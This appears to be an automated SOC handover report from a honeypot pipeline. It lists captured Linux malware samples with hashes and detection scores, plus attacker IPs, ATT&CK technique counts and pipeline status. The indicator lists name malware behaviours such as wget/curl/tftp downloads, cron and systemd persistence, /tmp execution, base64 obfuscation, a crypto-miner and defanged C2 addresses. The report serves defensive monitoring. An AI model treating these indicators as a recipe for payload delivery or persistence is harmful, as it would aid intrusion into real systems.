| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `026cc4f630776e0c9d42905bf3e9b048fda4da68d58c66e4a2e5bb3d8a9d787c` | ELF Binary (Linux executable) (x86-64 64-bit) | `026cc4f630776e0c...` | 31/100 | 🟢 LOW | **4/75** 🔴 |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0583d9e18684b6297a1219d34dd99c1045658f58c3e9a74ca060d8499a5a0439` | Shell Script | `0583d9e18684b629...` | 70/100 | 🔴 HIGH | **2/75** 🔴 |
| `05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `05af569c3595b01e...` | 84/100 | 🔴 HIGH | **37/75** 🔴 |
| `062ba629c7b2b914b289c8da0573c179fe86f2cb1f70a31f9a1400d563c3042a` | ELF Binary (Linux executable) (x86-64 64-bit) | `062ba629c7b2b914...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` | ELF Binary (Linux executable) (ARM 32-bit) | `07c0a0af63dde8dc...` | 86/100 | 🔴 HIGH | **40/75** 🔴 |
| `0886e17b38d09ef7b0855a2394dd33454939edb3f33a43096c93e0dccfe6a81c` | ELF Binary (Linux executable) (x86-64 64-bit) | `0886e17b38d09ef7...` | 34/100 | 🟢 LOW | **10/75** 🔴 |
| `094d2147548839ba5ed36d884983aaf14bd7ae650095dec96a1cf537d3b23b48` | ELF Binary (Linux executable) (x86-64 64-bit) | `094d2147548839ba...` | 45/100 | 🟡 MEDIUM | **39/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0c99433c7d433d65ab890dcee20b330f262379d532bc76f91e18f09ecfa5fb54` | Shell Script | `0c99433c7d433d65...` | 30/100 | 🟢 LOW | 0/75 ✅ |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0de787cffbec4dcc42e0ecd9491795c7dfe8fe4a955cb67a87544d5c36070982` | ELF Binary (Linux executable) (x86-64 64-bit) | `0de787cffbec4dcc...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` | Bash Script | `0fad00ddec16b67f...` | 70/100 | 🔴 HIGH | **25/75** 🔴 |
| `107a9bfb3d0bb71a33ae17a9eac844a7a7562270a09b5ccce608a78316df0222` | ELF Binary (Linux executable) (x86 32-bit) | `107a9bfb3d0bb71a...` | 35/100 | 🟢 LOW | **13/75** 🔴 |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `13960b7e69159907f67f84ce6398d29f73686602ef2c36d837237288f4fe8785` | Bash Script | `13960b7e69159907...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16254f69dc7011bdd51beb489af5e9825959e4098e565332da99f8cb58b7a76e` | ELF Binary (Linux executable) (x86 32-bit) | `16254f69dc7011bd...` | 30/100 | 🟢 LOW | **1/75** 🔴 |
| `163cb287fd8f81c13901eb4ddaea2db326213f4d2095e0e64321b9afd8300480` | ELF Binary (Linux executable) (x86 32-bit) | `163cb287fd8f81c1...` | 36/100 | 🟢 LOW | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `187b67e5e2116293144f4009b1f224ed09eea924dd4ade00741a66792a63b45a` | ELF Binary (Linux executable) (x86-64 64-bit) | `187b67e5e2116293...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `1913ed2ad175632b1b75e99bf5e291f551302b16dea51df318379e77a36f1ce9` | ELF Binary (Linux executable) (MIPS 32-bit) | `1913ed2ad175632b...` | 86/100 | 🔴 HIGH | **42/75** 🔴 |
| `1946ee7ec655de32199ce87390699db1e18d80438bdf01f3b813a929e5cce4e6` | ELF Binary (Linux executable) (MIPS 32-bit) | `1946ee7ec655de32...` | 58/100 | 🟡 MEDIUM | **45/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `19e78c00d07f011fcb708ffb12f8dd2fd0f1e57faaf21129b53c7f68ae611e60` | ELF Binary (Linux executable) (x86-64 64-bit) | `19e78c00d07f011f...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `1b3d42e9c13d4d3c0ac6b6aa1584d060b3bc354936be815e12c9a243a470c7f3` | Shell Script | `1b3d42e9c13d4d3c...` | 52/100 | 🟡 MEDIUM | **5/74** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1c847d3bd3ef4bf7e21a7091f1479e0e2ca432585ebea996653845b9adfb150e` | ELF Binary (Linux executable) (x86-64 64-bit) | `1c847d3bd3ef4bf7...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e5e56d2ffc990b1dd966e12a02d89d7dcad92c2f23c34834fbfa8c792d56520` | Unknown binary | `1e5e56d2ffc990b1...` | 22/100 | 🟢 LOW | **30/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`0583d9e18684b6297a1219d34dd99c1045658f58c3e9a74ca060d8499a5a0439` (0583d9e18684b6297a1219d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Hardware recon` — `cat /proc/cpuinfo`

_`05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` (05af569c3595b01e0724bc96...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/.kworker`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.161[.]96:55487`

_`07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` (07c0a0af63dde8dc2e36dc58...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` (0fad00ddec16b67f3131aa4e...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`1913ed2ad175632b1b75e99bf5e291f551302b16dea51df318379e77a36f1ce9` (1913ed2ad175632b1b75e99b...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`
- `Crypto miner binary` — `xmrig`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `104.234.41[.]32` | BR | Internet Utilities NA LLC | **100** ⚠️ | 9 |
| `137.184.5[.]188` | US | DigitalOcean, LLC | **100** ⚠️ | 50 |
| `77.239.124[.]130` | NL | ROCKET & MARINICA LTD | **100** ⚠️ | 50 |
| `103.148.235[.]249` | ID | RSUP DR KARIADI | **100** ⚠️ | 29 |
| `191.217.250[.]87` | NL | Ace Data Centers II, LLC | **100** ⚠️ | 8 |
| `64.62.197[.]182` | US | The Shadowserver Foundation, Inc. | **100** ⚠️ | 0 |
| `165.22.105[.]175` | SG | DigitalOcean, LLC | **100** ⚠️ | 10 |
| `8.221.136[.]6` | JP | Alibaba Cloud (Singapore) Private Limited | **100** ⚠️ | 50 |
| `166.62.41[.]96` | US | GoDaddy.com, LLC | **100** ⚠️ | 50 |
| `14.194.125[.]58` | IN | Tata Teleservices Limited -GSM Division | **100** ⚠️ | 32 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 69 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 67 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 21 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 15 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 8 |

---

## 🔕 False Positive Summary (38 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 19 |
| AbuseIPDB score 19 below threshold 25 | 4 |
| AbuseIPDB score 24 below threshold 25 | 5 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 9 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 150 cases |
| Tool 34  | Credential Extractor        | ✅ 1260 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 17 fingerprints |
| Tool 36  | Command Clustering          | ✅ 14 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 92 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 38 filtered (25.3%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 40 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 39 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 63 priority case(s) shown individually · 46 recon entry/entries in table (3 group(s) consolidating 6 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-11-27T05:46:08Z_
